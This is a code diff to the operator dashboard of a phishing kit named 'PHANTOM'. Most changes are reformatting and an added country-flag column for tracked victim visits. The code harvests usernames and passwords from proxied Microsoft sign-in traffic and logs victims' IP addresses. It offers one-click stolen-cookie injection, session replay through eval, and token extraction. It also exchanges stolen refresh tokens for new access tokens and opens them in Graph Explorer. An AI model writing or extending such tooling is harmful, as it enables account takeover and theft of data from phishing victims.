@@ -26,7 +26,6 @@
             transition: background 0.4s ease, color 0.4s ease;
         }
 
-        /* ----- GLASS BASE (dark) ----- */
         .glass {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(16px) saturate(180%);
@@ -42,7 +41,6 @@
             margin: 0 auto;
         }
 
-        /* ----- LIGHT THEME OVERRIDES ----- */
         body.light-glass {
             background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5);
             color: #1a1f2a;
@@ -155,7 +153,6 @@
             box-shadow: 0 0 12px #c92a2a;
         }
 
-        /* ----- Header ----- */
         .header {
             display: flex;
             justify-content: space-between;
@@ -217,7 +214,6 @@
             border-color: transparent;
         }
 
-        /* ----- Stats ----- */
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -254,7 +250,6 @@
             margin-top: 4px;
         }
 
-        /* ----- Toolbar ----- */
         .toolbar {
             display: flex;
             flex-wrap: wrap;
@@ -317,7 +312,6 @@
             box-shadow: 0 0 12px #ff6b6b;
         }
 
-        /* ----- Table ----- */
         .table-wrap {
             overflow-x: auto;
             padding: 4px;
@@ -388,20 +382,19 @@
         }
 
         .action-btn.replay:hover {
-    background: rgba(0, 255, 200, 0.1);
-    border-color: #00ffc8;
-    box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
-}
-.action-btn.token {
-    border-color: rgba(255, 215, 0, 0.2);
-    color: #ffd700;
-}
-.action-btn.token:hover {
-    background: rgba(255, 215, 0, 0.08);
-    border-color: #ffd700;
-}
+            background: rgba(0, 255, 200, 0.1);
+            border-color: #00ffc8;
+            box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
+        }
+        .action-btn.token {
+            border-color: rgba(255, 215, 0, 0.2);
+            color: #ffd700;
+        }
+        .action-btn.token:hover {
+            background: rgba(255, 215, 0, 0.08);
+            border-color: #ffd700;
+        }
 
-        /* ----- Map & Chart ----- */
         .grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -432,7 +425,6 @@
             height: 100% !important;
         }
 
-        /* ----- Modal ----- */
         .modal {
             display: none;
             position: fixed;
@@ -485,7 +477,6 @@
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        /* ----- Toast ----- */
         .toast {
             position: fixed;
             bottom: 24px;
@@ -510,7 +501,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ----- Responsive ----- */
         @media (max-width: 768px) {
             .grid-2 {
                 grid-template-columns: 1fr;
@@ -529,7 +519,6 @@
             }
         }
 
-        /* Leaflet overrides */
         .leaflet-control-zoom a {
             background: rgba(255, 255, 255, 0.08) !important;
             color: #e0e8f0 !important;
@@ -557,7 +546,6 @@
 </head>
 <body>
 <div class="container">
-    <!-- Header -->
     <header class="header glass">
         <h1>😈 PHANTOM</h1>
         <div class="header-actions">
@@ -566,7 +554,6 @@
         </div>
     </header>
 
-    <!-- Stats -->
     <div class="stats">
         <div class="stat-card glass">
             <label>Total Sessions</label>
@@ -585,7 +572,7 @@
         </div>
     </div>
 
-    <!-- Visit Stats (NEW) -->
+    <!-- Visit Stats -->
     <div class="stats">
         <div class="stat-card glass">
             <label>Total Visits</label>
@@ -604,7 +591,6 @@
         </div>
     </div>
 
-    <!-- Toolbar -->
     <div class="toolbar glass">
         <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
         <select id="filterDate" onchange="filterTable()">
@@ -619,7 +605,6 @@
         </div>
     </div>
 
-    <!-- Table -->
     <div class="table-wrap glass" style="padding: 8px;">
         <table>
             <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
@@ -627,21 +612,20 @@
         </table>
     </div>
 
-    <!-- Visits Table (NEW) -->
+    <!-- Visits Table with Country Flags -->
     <div class="table-wrap glass" style="padding: 8px; margin-top: 20px;">
         <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px;">
             <h3 style="color: rgba(255,255,255,0.6); font-weight: 400;">📊 Recent Visits</h3>
             <span style="font-size: 12px; color: rgba(255,255,255,0.3);">Live updates</span>
         </div>
         <table>
-            <thead><tr><th>Time</th><th>IP</th><th>User-Agent</th><th>Referer</th><th>URL</th></tr></thead>
+            <thead><tr><th>Time</th><th>🌍 Country</th><th>IP</th><th>User-Agent</th><th>Referer</th><th>URL</th></tr></thead>
             <tbody id="visitsTable">
-                <tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading visits...</td></tr>
+                <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading visits...</td></tr>
             </tbody>
         </table>
     </div>
 
-    <!-- Map & Chart -->
     <div class="grid-2">
         <div class="map-container glass">
             <div id="map"></div>
@@ -652,7 +636,6 @@
     </div>
 </div>
 
-<!-- Modal -->
 <div class="modal" id="modal">
     <div class="modal-content glass">
         <button class="modal-close" onclick="closeModal()">✕ Close</button>
@@ -661,20 +644,16 @@
     </div>
 </div>
 
-<!-- Toast container -->
 <div id="toastContainer"></div>
 
-<!-- Leaflet JS & Chart.js -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    // ---------- THEME TOGGLE ----------
     function toggleTheme() {
         document.body.classList.toggle('light-glass');
         const isLight = document.body.classList.contains('light-glass');
         localStorage.setItem('theme', isLight ? 'light' : 'dark');
     }
 
-    // Restore theme preference
     (function restoreTheme() {
         const saved = localStorage.getItem('theme');
         if (saved === 'light') {
@@ -682,14 +661,12 @@
         }
     })();
 
-    // ---------- STATE ----------
     let allLogs = [];
     let map = null;
     let chart = null;
     let reconnectAttempts = 0;
     const maxReconnectAttempts = 20;
 
-    // ---------- WEBSOCKET (with auto-reconnect & heartbeat) ----------
     let ws;
     
     function connectWebSocket() {
@@ -702,7 +679,6 @@
             wsDot.className = 'ws-dot online';
             wsLabel.textContent = 'Live';
             reconnectAttempts = 0;
-            // Start heartbeat
             startHeartbeat();
         };
 
@@ -736,7 +712,6 @@
         };
     }
 
-    // ---------- HEARTBEAT (ping every 25s) ----------
     let heartbeatInterval;
     
     function startHeartbeat() {
@@ -748,7 +723,6 @@
         }, 25000);
     }
 
-    // ---------- SHOW TOAST ----------
     function showToast(msg, isError = false) {
         const container = document.getElementById('toastContainer');
         const toast = document.createElement('div');
@@ -758,7 +732,15 @@
         setTimeout(() => { toast.remove(); }, 4000);
     }
 
-    // ---------- FETCH LOGS ----------
+    // ---------- HELPER: Get Flag Emoji ----------
+    function getFlagEmoji(countryCode) {
+        if (!countryCode || countryCode.length !== 2) return '🌍';
+        return String.fromCodePoint(
+            0x1F1E6 + countryCode.charCodeAt(0) - 65,
+            0x1F1E6 + countryCode.charCodeAt(1) - 65
+        );
+    }
+
     async function refreshLogs() {
         try {
             const res = await fetch('/dash/api/logs');
@@ -768,98 +750,95 @@
             updateStats(logs);
             updateMap(logs);
             updateChart(logs);
-            await fetchVisits(); // ✅ Added visit tracking
+            await fetchVisits();
         } catch (e) {
             showToast('Failed to fetch logs: ' + e.message, true);
         }
     }
 
     function renderTable(logs) {
-    const tbody = document.getElementById('logTable');
-    const search = document.getElementById('searchInput').value.toLowerCase();
-    const filter = document.getElementById('filterDate').value;
-    const now = new Date();
-    let filtered = logs;
+        const tbody = document.getElementById('logTable');
+        const search = document.getElementById('searchInput').value.toLowerCase();
+        const filter = document.getElementById('filterDate').value;
+        const now = new Date();
+        let filtered = logs;
 
-    if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
-    if (filter === 'today') {
-        filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
-    } else if (filter === 'week') {
-        const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
-        filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
+        if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
+        if (filter === 'today') {
+            filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
+        } else if (filter === 'week') {
+            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
+            filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
+        }
+
+        tbody.innerHTML = '';
+        filtered.forEach(log => {
+            const date = new Date(log.modified).toLocaleString();
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td><span class="badge">${log.name}</span></td>
+                <td>${(log.size / 1024).toFixed(1)} KB</td>
+                <td>${date}</td>
+                <td id="user-${log.name}">Loading...</td>
+                <td id="ip-${log.name}">Loading...</td>
+                <td>
+                    <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
+                    <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
+                    <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
+                    <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
+                </td>
+            `;
+            tbody.appendChild(row);
+            fetchMetadata(log.name);
+        });
     }
 
-    tbody.innerHTML = '';
-    filtered.forEach(log => {
-        const date = new Date(log.modified).toLocaleString();
-        const row = document.createElement('tr');
-        row.innerHTML = `
-            <td><span class="badge">${log.name}</span></td>
-            <td>${(log.size / 1024).toFixed(1)} KB</td>
-            <td>${date}</td>
-            <td id="user-${log.name}">Loading...</td>
-            <td id="ip-${log.name}">Loading...</td>
-            <td>
-                <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
-                <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
-                <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
-                <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
-            </td>
-        `;
-        tbody.appendChild(row);
-        fetchMetadata(log.name);
-    });
-}
     async function fetchMetadata(filename) {
-    try {
-        const res = await fetch(`/dash/api/log/${filename}`);
-        const data = await res.json();
-        if (data.entries && data.entries.length > 0) {
-            let username = 'N/A', ip = 'N/A';
-            // Search through ALL entries for credentials
-            for (const entry of data.entries) {
-                const body = entry.proxyRequestBody;
-                if (body) {
-                    try {
-                        const parsed = typeof body === 'string' ? JSON.parse(body) : body;
-                        // Common Microsoft OAuth fields
-                        username = parsed.username || parsed.login || parsed.user || 
-                                   parsed.Email || parsed.upn || parsed.loginfmt || 
-                                   parsed.passwd || parsed.Password || 'N/A';
-                        if (username !== 'N/A') break;
-                    } catch (e) {
-                        // Try URL-encoded form data
-                        const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
-                        if (match) {
-                            username = decodeURIComponent(match[1]);
-                            break;
+        try {
+            const res = await fetch(`/dash/api/log/${filename}`);
+            const data = await res.json();
+            if (data.entries && data.entries.length > 0) {
+                let username = 'N/A', ip = 'N/A';
+                for (const entry of data.entries) {
+                    const body = entry.proxyRequestBody;
+                    if (body) {
+                        try {
+                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
+                            username = parsed.username || parsed.login || parsed.user || 
+                                       parsed.Email || parsed.upn || parsed.loginfmt || 
+                                       parsed.passwd || parsed.Password || 'N/A';
+                            if (username !== 'N/A') break;
+                        } catch (e) {
+                            const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
+                            if (match) {
+                                username = decodeURIComponent(match[1]);
+                                break;
+                            }
                         }
                     }
+                    ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
+                         entry.proxyRequestHeaders?.['x-real-ip'] ||
+                         entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
+                         'N/A';
+                    if (ip !== 'N/A') break;
                 }
-                // Extract IP from headers
-                ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
-                     entry.proxyRequestHeaders?.['x-real-ip'] ||
-                     entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
-                     'N/A';
-                if (ip !== 'N/A') break;
+                const userCell = document.getElementById(`user-${filename}`);
+                if (userCell) userCell.textContent = username;
+                const ipCell = document.getElementById(`ip-${filename}`);
+                if (ipCell) ipCell.textContent = ip;
             }
-            const userCell = document.getElementById(`user-${filename}`);
-            if (userCell) userCell.textContent = username;
-            const ipCell = document.getElementById(`ip-${filename}`);
-            if (ipCell) ipCell.textContent = ip;
-        }
-    } catch (e) { /* silently fail */ }
-}
-    // ---------- UPDATE STATS ----------
-function updateStats(logs) {
-    document.getElementById('total').textContent = logs.length;
-    if (logs.length > 0) {
-        document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
-    } else {
-        document.getElementById('last').textContent = 'No captures';
+        } catch (e) { /* silently fail */ }
     }
-}
-    // ---------- MAP ----------
+
+    function updateStats(logs) {
+        document.getElementById('total').textContent = logs.length;
+        if (logs.length > 0) {
+            document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
+        } else {
+            document.getElementById('last').textContent = 'No captures';
+        }
+    }
+
     function updateMap(logs) {
         if (!map) {
             map = L.map('map').setView([20, 0], 2);
@@ -874,7 +853,6 @@ function updateStats(logs) {
             .bindPopup('📍 IP locations will appear here once you have captures.');
     }
 
-    // ---------- CHART ----------
     function updateChart(logs) {
         const ctx = document.getElementById('captureChart').getContext('2d');
         const now = new Date();
@@ -918,21 +896,19 @@ function updateStats(logs) {
         });
     }
 
-    // ---------- FETCH VISITS (NEW) ----------
+    // ---------- FETCH VISITS (with Country Flags) ----------
     async function fetchVisits() {
         try {
             const res = await fetch('/dash/api/visits');
             const data = await res.json();
             
-            // Update stats
             document.getElementById('totalVisits').textContent = data.total || 0;
             document.getElementById('uniqueIPs').textContent = data.uniqueIPs || 0;
             document.getElementById('todayVisits').textContent = data.today || 0;
             
-            // Display visits in table
             const tbody = document.getElementById('visitsTable');
             if (!data.visits || data.visits.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No visits recorded yet</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No visits recorded yet</td></tr>`;
                 return;
             }
             
@@ -944,9 +920,11 @@ function updateStats(logs) {
                 const truncatedUA = userAgent.length > 40 ? userAgent.substring(0, 40) + '...' : userAgent;
                 const referer = visit.referer || 'Direct';
                 const url = visit.url || '/';
+                const flag = getFlagEmoji(visit.countryCode || 'UN');
                 
                 row.innerHTML = `
                     <td style="font-size:12px; color:rgba(255,255,255,0.6);">${time}</td>
+                    <td style="font-size:18px; text-align:center;" title="${visit.countryCode || 'UN'}">${flag}</td>
                     <td style="font-family:monospace; font-size:13px;">${visit.ip}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.6);">${truncatedUA}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.4);">${referer}</td>
@@ -956,16 +934,14 @@ function updateStats(logs) {
             });
         } catch (e) {
             console.error('Failed to fetch visits:', e);
-            document.getElementById('visitsTable').innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Error loading visits</td></tr>`;
+            document.getElementById('visitsTable').innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Error loading visits</td></tr>`;
         }
     }
 
-    // ---------- FILTER ----------
     function filterTable() {
         renderTable(allLogs);
     }
 
-    // ---------- VIEW LOG ----------
     async function viewLog(filename) {
         const modal = document.getElementById('modal');
         const title = document.getElementById('modalTitle');
@@ -1012,7 +988,6 @@ function updateStats(logs) {
         }
     }
 
-    // ---------- COOKIE INJECTOR ----------
     async function injectCookies(filename) {
         try {
             const res = await fetch(`/dash/api/log/${filename}`);
@@ -1048,77 +1023,70 @@ function updateStats(logs) {
         }
     }
 
-    // ---------- SESSION REPLAY ----------
-async function replaySession(filename) {
-    try {
-        const res = await fetch(`/dash/api/replay/${filename}`);
-        const data = await res.json();
-        if (data.error) {
-            showToast('❌ Replay failed: ' + data.error, true);
-            return;
-        }
-        // Execute the replay script in the current tab
-        eval(data.replayScript);
-        showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
-    } catch (e) {
-        showToast('❌ Replay error: ' + e.message, true);
-    }
-}
-
-// ---------- SHOW TOKENS ----------
-async function showTokens(filename) {
-    try {
-        const res = await fetch(`/dash/api/tokens/${filename}`);
-        const data = await res.json();
-        if (data.error) {
-            showToast('❌ Token extraction failed: ' + data.error, true);
-            return;
-        }
-        const tokens = data.tokens;
-        let msg = `🔑 Extracted:\n`;
-        msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
-        msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
-        msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
-        msg += `  • Cookies: ${tokens.cookies.length}\n`;
-        msg += `  • Sessions: ${tokens.sessions.length}`;
-        
-        // If we have a refresh token, offer to exchange it
-        if (tokens.refresh_tokens.length > 0) {
-            msg += `\n\n🔄 Refresh token available. Click OK to exchange for a new access token.`;
-            if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
-                await exchangeRefreshToken(tokens.refresh_tokens[0]);
+    async function replaySession(filename) {
+        try {
+            const res = await fetch(`/dash/api/replay/${filename}`);
+            const data = await res.json();
+            if (data.error) {
+                showToast('❌ Replay failed: ' + data.error, true);
                 return;
             }
+            eval(data.replayScript);
+            showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
+        } catch (e) {
+            showToast('❌ Replay error: ' + e.message, true);
         }
-        alert(msg);
-    } catch (e) {
-        showToast('❌ Token error: ' + e.message, true);
     }
-}
 
-async function exchangeRefreshToken(refreshToken) {
-    try {
-        const response = await fetch('/dash/api/exchange', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ refresh_token: refreshToken })
-        });
-        const data = await response.json();
-        if (data.access_token) {
-            showToast(`✅ New access token obtained: ${data.access_token.slice(0, 30)}...`);
-            // Store token for later use
-            localStorage.setItem('evil_token', JSON.stringify(data));
-            // Open Graph Explorer
-            window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
-        } else {
-            showToast('❌ Token exchange failed: ' + (data.error || 'Unknown error'), true);
+    async function showTokens(filename) {
+        try {
+            const res = await fetch(`/dash/api/tokens/${filename}`);
+            const data = await res.json();
+            if (data.error) {
+                showToast('❌ Token extraction failed: ' + data.error, true);
+                return;
+            }
+            const tokens = data.tokens;
+            let msg = `🔑 Extracted:\n`;
+            msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
+            msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
+            msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
+            msg += `  • Cookies: ${tokens.cookies.length}\n`;
+            msg += `  • Sessions: ${tokens.sessions.length}`;
+            
+            if (tokens.refresh_tokens.length > 0) {
+                msg += `\n\n🔄 Refresh token available. Click OK to exchange for a new access token.`;
+                if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
+                    await exchangeRefreshToken(tokens.refresh_tokens[0]);
+                    return;
+                }
+            }
+            alert(msg);
+        } catch (e) {
+            showToast('❌ Token error: ' + e.message, true);
         }
-    } catch (e) {
-        showToast('❌ Exchange error: ' + e.message, true);
     }
-}
-    
-   // ---------- EXPORT ----------
+
+    async function exchangeRefreshToken(refreshToken) {
+        try {
+            const response = await fetch('/dash/api/exchange', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ refresh_token: refreshToken })
+            });
+            const data = await response.json();
+            if (data.access_token) {
+                showToast(`✅ New access token obtained: ${data.access_token.slice(0, 30)}...`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+            } else {
+                showToast('❌ Token exchange failed: ' + (data.error || 'Unknown error'), true);
+            }
+        } catch (e) {
+            showToast('❌ Exchange error: ' + e.message, true);
+        }
+    }
+
     async function exportAll() {
         try {
             const res = await fetch('/dash/api/export/all');
@@ -1141,7 +1109,6 @@ async function exchangeRefreshToken(refreshToken) {
         }
     }
 
-    // ---------- MODAL ----------
     function closeModal() {
         document.getElementById('modal').style.display = 'none';
     }
@@ -1149,12 +1116,8 @@ async function exchangeRefreshToken(refreshToken) {
         if (e.target === this) closeModal();
     });
 
-    // ---------- INIT ----------
-    // Start WebSocket connection
     connectWebSocket();
-    // Fetch initial logs
     refreshLogs();
-    // Auto-refresh every 15 seconds
     setInterval(refreshLogs, 15000);
 </script>
 </body>
